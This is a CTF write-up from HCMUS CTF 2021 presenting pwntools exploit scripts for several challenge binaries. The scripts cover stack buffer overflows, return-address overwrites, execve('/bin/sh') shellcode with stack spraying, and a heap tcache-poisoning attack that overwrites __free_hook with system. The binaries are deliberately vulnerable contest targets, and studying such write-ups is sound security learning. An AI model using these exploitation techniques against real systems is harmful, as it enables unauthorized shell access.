---
title: "HCMUS CTF 2021"
description: "HCMUS CTF 2021 Pwnable Writeup"
summary: "HCMUS CTF 2021 Pwnable Writeup"
categories: ["Writeup"]
tags: ["Pwnable"]
#externalUrl: ""
date: 2021-06-07
draft: false
authors:
  - th3_5had0w
---

## Qualification

### mybirthday

The program needs to get the result of this comparison to be 0 to run the shell

`cmp    DWORD PTR [ebp-0xc],0xcabbfeff`

Nothing special in this challenge, just a basic memory modifying, i overflowed the input and overwritten the default var value with 0xcabbfeff. My script:

```python
from pwn import *

#io = process('./hpbd')
io = remote('61.28.237.24', 30200)


print(io.recvuntil('?\n'))
payload = b'A'*24+p32(0xcabbfeff)
io.sendline(payload)
io.interactive()
```

### bank1

This is just a blind overflow challenge, you send a lot of input and the server will return the flag.

### bank2

This challenge is not much different from `bank1`, another memory modifying challenge. My script:

```python
from pwn import *

io = remote('61.28.237.24', 30203)
#io = process('./bank2')

print(io.recvuntil(': '))
payload = b'A'*64+p32(0x66a44)
io.sendline(payload)
print(io.recvall())
```

### bank3

This challenge requires us to overwritten the return address of the function, so the program flow will be redirected to the function which will spawn a shell. Here's the script:

```python
from pwn import *

#io = process('./bank3')
io = remote('61.28.237.24', 30204)

payload = b'A'*80+p32(0x08048506)

print(io.recvuntil(': '))
io.sendline(payload)
print(io.recvall())
```

### SecretWeapon

Another offset calculation challenge, the program first gave us the address of `townsquare` function, in the binary we already had `/bin/sh` string and `run_cmd` function, we just need to calculate the offset between `townsquare` and those, last step we just need to craft a exploit chain so the `/bin/sh` will be executed by `run_cmd`, which should be easy:

```python
from pwn import *

elf = ELF('./weapon')
#io = process('./weapon')
io = remote('61.28.237.24', 30201)

print(io.recvline())
base = int(io.recv().split()[-1], 16)
cmd = base -84
bash = base+3337

payload = b'A'*4+b'B'*4+b'C'*4+b'D'*4+b'E'*4+b'F'*4+b'J'*4+p32(cmd)+b'A'*4+p32(bash)
pause()
io.sendline(payload)
io.interactive()
```

After had finished 5 of those, my python3 gone wrong and got broken, so i couldn't use pwntools, also i was sleepy, i decided to take a rest and solve the rest challenge later, but when i woke up, a member from my team had already solved bank4 and bank5, so i continued solving bank6, and went back to sleep, again.

### bank6

Bank6 is a shellcode + stack spraying challenge

First i wrote a basic shellcode as usual, like this:

```asm
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
d:  89 e3                   mov    ebx,esp
f:  50                      push   eax
10: 53                      push   ebx
11: 89 e1                   mov    ecx,esp
13: b0 0b                   mov    al,0xb
15: cd 80                   int    0x80
```

But we need to modify the shellcode, because the program use `scanf` function to get input, which will end the input string when it meets white spaces (the input stopped at 0x0b byte which is a "VT vertical tab"). So i did a few fix and the final shellcode will look like this:

```asm
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
d:  89 e3                   mov    ebx,esp
f:  50                      push   eax
10: 53                      push   ebx
11: 89 e1                   mov    ecx,esp
13: b0 b0                   mov    al,0xb0
15: 2c a5                   sub    al,0xa5
17: cd 80                   int    0x80
```

Because the shellcode is 25 bytes long, i appended 3 more `\x90` (nop) byte before the shellcode to get stack dword aligned for stack spraying, finally, spray the return address which was leaked in the program: `[+] Here is a gift: 0xffa55cac`

Here is the final script:

```python
from pwn import *

shellcode = b'\x90'*3+b'\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\xB0\x2C\xA5\xCD\x80'

#io = process('./bank6')
io = remote('61.28.237.24', 30207)
print(io.recvline())
stack_addr = int(io.recvline().split()[-1], 16)

payload = shellcode+ 259*p32(stack_addr)
print(payload)

print(io.recv())
pause()
io.sendline(payload)
io.interactive()
```

## Final

### Book manager \[200pts\] (HCMUSCTF2021 Final)

> [book_manager](https://github.com/th3-5had0w/CTF-contests/raw/master/HCMUSCTF-Final-2021/Book_manager/book_manager)
>
> [source code](https://github.com/th3-5had0w/CTF-contests/raw/master/HCMUSCTF-Final-2021/Book_manager/book_manager.c)
>
> [libc](https://github.com/th3-5had0w/CTF-contests/raw/master/HCMUSCTF-Final-2021/Book_manager/libc-2.31.so)

#### The vulnerability

After a while i managed to find out 2 vulnerabilities in the binary:

* The binary duplicate page but does not check the size of page:
```c
idx = get_int_prompt("[+] Which book you want to copy from?: ");
PBook pBook = get_book(idx);
idx = get_int_prompt("[+] Which page you want to copy from?: ");
char* page = get_page(pBook, idx);
char* new_page = strdup(page);
*page_size = pBook->page_size[idx]; // the vulnerability here
return new_page;
```

* The print page function allows us to print deallocated memories:
```c
void print_page()
{
    int idx;
    idx = get_int_prompt("[+] Which book you want to print?: ");
    PBook pBook = get_book(idx);
    idx = get_int_prompt("[+] Which page you want to print?: ");
    if (idx < 0 || idx >= MAX_BOOK_PAGES)
        hacker();
    printf("[+] Content: %s\n", pBook->page[idx]); 
    // read the content in page without checking if the page has been deallocated or not
}
```

#### Exploit
With the first vulnerability, i was able to overwrite the next heap's metadata, which led to buffer overflow on the heap:
```python
add(4, 1000, b'A'*4) # add page to book 4: b4->[0]
dup(4, 4, 0) # duplicate page 0 of book 4: b4->[0,1]
add(4, 0x40, b'A') # add target page to book 4: b4->[0,1,2]
add(4, 0x40, b'A') # add dummy page to book 4: b4->[0,1,2,3]
dele(4) # remove page dummy page from book 4
dele(4) # remove page target page from book 4
#crafting payload
pl = b'A'*24+p64(0x51)
pl += p64(libc_start_main - elf.sym['__libc_start_main'] + 0x1eeb28-8)
pl += p64(0) #+p64(heap_base + 0x10) remove hashtag for libc 2.32
edit(4, 1, pl) # overwrite target page's forward pointer with __free_hook address
```

With the second vulnerability, i was able to leak heap and leak libc through main_arena (unsortedbin):
```python
# leak heap
add(2, 4, b'A') # target
add(2, 4, b'B') # dummy
dele(2) # free dummy
dele(2) # free target
prit(2, 0) # print target's forward pointer
print(io.recvuntil(b'[+] Content: '))
a = io.recv(4)+b'\0\0\0\0'
heap_base = u64(a)- 0x2c0 # calculate the base heap
b = hex(heap_base)
log.info(f'Heap: {b}')
add(2, 4, b'A') # realign heap
add(2, 4, b'B') # realign heap


# leak libc
add(0, 2000, b'AAAA') # target
add(1, 2000, b'BBBB') # dummy to prevent heap collision
dele(0) # free target
prit(0, 0) # print target's <main_arena+96> address
print(io.recvuntil(b'[+] Content: '))
a= io.recv(6)+b'\0\0'
libc_start_main = u64(a)-1854496 # calculate libc_start_main
add(0, 2000, b'AAAA') # realign heap
```

So from the two vulnerability above, we archived arbitrary write

#### Exploit Code
```python
from pwn import *

io = process('./book_manager')
#io = remote('61.28.237.24', 30208)
elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def add(book_idx, page_size, content):
    print(io.recvuntil(b'> Your choice: '))
    io.sendline('1')
    print(io.recvuntil(b'[+] Which book you want to add a new page?: '))
    io.sendline(str(book_idx))
    print(io.recvuntil(b'> '))
    io.sendline('1')
    print(io.recvuntil(b'[+] New page size: '))
    io.sendline(str(page_size))
    print(io.recvuntil(b'[+] Enter new content: '))
    io.send(content)

def dup(book_idx, book_to_dup_from, page_to_dup_from):
    print(io.recvuntil(b'> Your choice: '))
    io.sendline('1')
    print(io.recvuntil(b'[+] Which book you want to add a new page?: '))
    io.sendline(str(book_idx))
    print(io.recvuntil(b'> '))
    io.sendline('2')
    print(io.recvuntil(b'[+] Which book you want to copy from?: '))
    io.sendline(str(book_to_dup_from))
    print(io.recvuntil(b'[+] Which page you want to copy from?: '))
    io.sendline(str(page_to_dup_from))

def prit(book_idx, page_idx):
    print(io.recvuntil(b'> Your choice: '))
    io.sendline('2')
    print(io.recvuntil(b'[+] Which book you want to print?: '))
    io.sendline(str(book_idx))
    print(io.recvuntil(b'[+] Which page you want to print?: '))
    io.sendline(str(page_idx))

def edit(book_idx, page_idx, content):
    print(io.recvuntil(b'> Your choice: '))
    io.sendline('3')
    print(io.recvuntil(b'[+] Which book you want to edit?: '))
    io.sendline(str(book_idx))
    print(io.recvuntil(b'[+] Which page you want to edit?: '))
    io.sendline(str(page_idx))
    print(io.recvuntil(b'[+] Enter new content: '))
    io.send(content)

def dele(book_to_delete_page_from):
    print(io.recvuntil(b'> Your choice: '))
    io.sendline('4')
    print(io.recvuntil(b'[+] Which book you want to delete page?: '))
    io.sendline(str(book_to_delete_page_from))


# leak heap
add(2, 4, b'A') # target
add(2, 4, b'B') # dummy
dele(2) # free dummy
dele(2) # free target
prit(2, 0) # print target's forward pointer
print(io.recvuntil(b'[+] Content: '))
a = io.recv(4)+b'\0\0\0\0'
heap_base = u64(a)- 0x2c0 # calculate the base heap
b = hex(heap_base)
log.info(f'Heap: {b}')
add(2, 4, b'A') # realign heap
add(2, 4, b'B') # realign heap


# leak libc
add(0, 2000, b'AAAA') # target
add(1, 2000, b'BBBB') # dummy to prevent heap collision
dele(0) # free target
prit(0, 0) # print target's <main_arena+96> address
print(io.recvuntil(b'[+] Content: '))
a= io.recv(6)+b'\0\0'
libc_start_main = u64(a)-1854496 # calculate libc_start_main
add(0, 2000, b'AAAA') # realign hea


add(4, 1000, b'A'*4) # add page to book 4: b4->[0]
dup(4, 4, 0) # duplicate page 0 of book 4: b4->[0,1]
add(4, 0x40, b'A') # add target page to book 4: b4->[0,1,2]
add(4, 0x40, b'A') # add dummy page to book 4: b4->[0,1,2,3]
dele(4) # remove page dummy page from book 4
dele(4) # remove page target page from book 4
#crafting payload
pl = b'A'*24+p64(0x51)
pl += p64(libc_start_main - elf.sym['__libc_start_main'] + 0x1eeb28 - 8) # __free_hook - 8
pl += p64(0) #+p64(heap_base + 0x10) remove hashtag for libc 2.32
edit(4, 1, pl) # overwrite target page's forward pointer with __free_hook address
add(4, 0x40, b'A') # malloc target heap, the next malloc will allocate memory at __free_hook
add(4, 0x40, b"/bin/sh\0" + p64(libc_start_main-elf.sym['__libc_start_main']+elf.sym['system']))
# this step is a trick, you could also overwrite with one_gadget but you can use this trick
# if the one_gadget fails, write /bin/sh\0 to __free_hook - 8 and write system to __free_hook
dele(4) # trigger system call /bin/sh
io.interactive()
```